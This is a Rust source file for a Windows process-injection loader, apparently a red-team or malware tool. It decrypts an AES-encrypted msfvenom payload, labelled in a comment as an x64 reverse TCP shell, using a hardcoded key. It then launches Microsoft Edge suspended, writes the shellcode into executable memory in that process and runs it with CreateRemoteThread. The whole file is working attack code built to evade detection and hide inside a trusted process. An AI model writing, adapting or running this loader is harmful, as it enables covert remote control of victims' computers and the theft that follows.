use winapi::um::processthreadsapi::{OpenProcess, CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CreateRemoteThread};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use std::ptr::{null_mut, null};
use std::ffi::CString;
use winapi::um::winbase::CREATE_SUSPENDED;
use std::mem;
use libaes::Cipher;
use base64::prelude::*;

fn main() {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    // let shellcode: [u8; 288] = [181, 113, 254, 202, 196, 217, 20, 162, 165, 53, 95, 92, 67, 164, 247, 176, 8, 81, 22, 155, 91, 36, 246, 132, 83, 59, 62, 147, 83, 31, 47, 53, 47, 63, 35, 145, 149, 100, 147, 66, 85, 161, 141, 234, 207, 4, 189, 219, 83, 84, 43, 22, 74, 27, 58, 113, 96, 164, 237, 43, 82, 20, 165, 123, 247, 229, 152, 180, 115, 230, 116, 205, 106, 239, 97, 7, 45, 70, 150, 219, 240, 205, 226, 251, 7, 0, 248, 207, 141, 12, 85, 144, 41, 210, 179, 68, 212, 91, 30, 249, 35, 162, 104, 191, 219, 213, 237, 79, 247, 88, 105, 146, 80, 150, 121, 28, 36, 228, 149, 232, 222, 254, 62, 213, 24, 148, 127, 204, 161, 53, 160, 44, 102, 189, 68, 100, 196, 158, 200, 84, 45, 19, 200, 53, 69, 46, 146, 178, 61, 65, 60, 125, 102, 202, 30, 167, 117, 113, 4, 214, 205, 143, 158, 24, 107, 77, 138, 104, 18, 116, 123, 180, 166, 120, 163, 61, 48, 206, 246, 127, 247, 209, 102, 239, 33, 86, 97, 32, 75, 226, 128, 161, 76, 254, 196, 116, 55, 250, 57, 220, 38, 16, 128, 66, 122, 188, 35, 67, 233, 228, 0, 150, 90, 219, 2, 233, 21, 132, 137, 110, 192, 73, 50, 191, 36, 154, 166, 218, 202, 113, 185, 72, 72, 28, 132, 183, 217, 234, 41, 177, 36, 33, 100, 165, 60, 68, 198, 21, 17, 1, 103, 38, 47, 64, 169, 94, 81, 246, 172, 98, 181, 103, 64, 175, 98, 174, 47, 43, 90, 87, 149, 87, 27, 253, 113, 222, 54, 126, 106, 164, 107, 242, 44, 249, 55, 86, 17, 29];
    //msfvenom reverse_shell_tcp for x64 windows
    let shellcode: [u8; 464] = [181, 113, 254, 202, 196, 217, 20, 162, 165, 53, 95, 92, 67, 164, 247, 176, 8, 81, 22, 155, 91, 36, 246, 132, 83, 59, 62, 147, 83, 31, 47, 53, 47, 63, 35, 145, 149, 100, 147, 66, 85, 161, 141, 234, 207, 4, 189, 219, 83, 84, 43, 22, 74, 27, 58, 113, 96, 164, 237, 43, 82, 20, 165, 123, 247, 229, 152, 180, 115, 230, 116, 205, 106, 239, 97, 7, 45, 70, 150, 219, 240, 205, 226, 251, 7, 0, 248, 207, 141, 12, 85, 144, 41, 210, 179, 68, 212, 91, 30, 249, 35, 162, 104, 191, 219, 213, 237, 79, 247, 88, 105, 146, 80, 150, 121, 28, 36, 228, 149, 232, 222, 254, 62, 213, 24, 148, 127, 204, 161, 53, 160, 44, 102, 189, 68, 100, 196, 158, 200, 84, 45, 19, 200, 53, 69, 46, 146, 178, 61, 65, 60, 125, 102, 202, 30, 167, 117, 113, 4, 214, 205, 143, 158, 24, 107, 77, 138, 104, 18, 116, 123, 180, 166, 120, 163, 61, 48, 206, 246, 127, 247, 209, 102, 239, 33, 86, 97, 32, 75, 226, 128, 161, 84, 31, 137, 158, 100, 179, 85, 97, 229, 191, 190, 33, 243, 244, 78, 141, 127, 56, 32, 99, 14, 185, 228, 113, 151, 118, 0, 128, 212, 24, 43, 121, 21, 252, 121, 185, 98, 188, 25, 231, 145, 72, 45, 81, 12, 74, 226, 131, 219, 183, 174, 26, 31, 182, 133, 0, 25, 177, 135, 95, 252, 105, 214, 102, 177, 167, 37, 99, 15, 74, 135, 43, 104, 93, 90, 224, 38, 127, 74, 105, 99, 76, 243, 63, 111, 184, 169, 139, 117, 144, 204, 166, 224, 206, 57, 151, 143, 109, 131, 62, 107, 193, 105, 75, 206, 141, 253, 134, 163, 229, 220, 102, 214, 132, 162, 165, 46, 22, 87, 238, 23, 218, 159, 92, 77, 252, 52, 151, 127, 212, 174, 116, 150, 65, 86, 225, 198, 111, 181, 229, 173, 218, 56, 110, 202, 19, 118, 3, 33, 13, 62, 136, 50, 27, 97, 117, 1, 101, 8, 112, 77, 96, 217, 133, 74, 0, 71, 164, 109, 25, 158, 66, 220, 7, 85, 61, 82, 138, 147, 230, 126, 122, 226, 3, 17, 185, 21, 228, 189, 20, 107, 6, 126, 56, 150, 216, 238, 161, 243, 196, 252, 189, 13, 199, 17, 158, 242, 244, 9, 177, 82, 181, 4, 66, 196, 231, 172, 186, 52, 161, 92, 202, 111, 180, 143, 142, 21, 115, 134, 67, 125, 97, 32, 118, 0, 94, 58, 43, 166, 246, 240, 82, 39, 17, 28, 75, 152, 59, 232, 253, 125, 29, 51, 48, 104, 214, 19, 205, 53, 177, 206, 179, 155, 122, 113, 245, 169, 213, 178, 237, 200, 185];
    // let encrypted_b64 = "tXH+ysTZFKKlNV9cQ6T3sAhRFptbJPaEUzs+k1MfLzUvPyORlWSTQlWhjerPBL3bU1QrFkobOnFgpO0rUhSle/flmLRz5nTNau9hBy1GltvwzeL7BwD4z40MVZAp0rNE1Fse+SOiaL/b1e1P91hpklCWeRwk5JXo3v4+1RiUf8yhNaAsZr1EZMSeyFQtE8g1RS6Ssj1BPH1myh6ndXEE1s2PnhhrTYpoEnR7tKZ4oz0wzvZ/99Fm7yFWYSBL4oChVB+JnmSzVWHlv74h8/ROjX84IGMOueRxl3YAgNQYK3mJqYl2F8wP+xWjIkiskke2rVmw2NBkACf7C4SHdk+A59fm/9WwZaPHqyf9W6VQA5SMO33dbE9fo2Ikq6BNZb2ZHnm8TylA70NJUe0ANKTGquXSdwYxX+FKBQX/wYMAAPI4q1a7CHuYAfBXAY2kS6z5yn8m4pXDr88CedxreWKp3SjBmXB8TAx48lejEmxGJTgCLQdXVr+TtXhPoVH7FNOAxbEuYiDMg/6ebmwotvGARBbVFO5EX0ITVmaKHbjOcL/S7lbLPN3ioRsWfL6Xi5VcImhkwXoqslPPebnaC9t9xXA+U8KQjsm6R4bBzwyspcQ=";
    // let encrypted = BASE64_STANDARD.decode(encrypted_b64);
    // let shellcode = &encrypted;
    let key = b"PINGU_SECRET_PASSWORD_IMPOSSIBLE";
    let iv = b"This is 16 bytes";
    let cipher = Cipher::new_256(key);
    let shellcode  = cipher.cbc_decrypt(iv, &shellcode);
    let shsize: i32 = shellcode.len().try_into().unwrap();

    let exe: CString = CString::new("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe").unwrap();
    let mut startupinfoa: STARTUPINFOA = unsafe { mem::zeroed() };
    startupinfoa.cb = mem::size_of::<STARTUPINFOA>() as u32;
    let mut process_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };

    let result = unsafe {
        CreateProcessA(
            null(),
            exe.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut startupinfoa,
            &mut process_info,
        )
    };

    let proc = unsafe {
        OpenProcess(0x1F0FFF, 0, process_info.dwProcessId)
    };

    let memaddr = unsafe {
        VirtualAllocEx(proc, std::ptr::null_mut(),
        shsize.try_into().unwrap(),
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    };

    let writescmem = unsafe {
        WriteProcessMemory(proc,
            memaddr,
            shellcode.as_ptr() as *const _,
            shsize.try_into().unwrap(),
            std::ptr::null_mut())
    };

    let thrd = unsafe {
        CreateRemoteThread(proc,
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(memaddr)),
            std::ptr::null_mut(),
            0x0,
            std::ptr::null_mut())
    };

    println!("{}", "[+] Shellcode loaded!");
}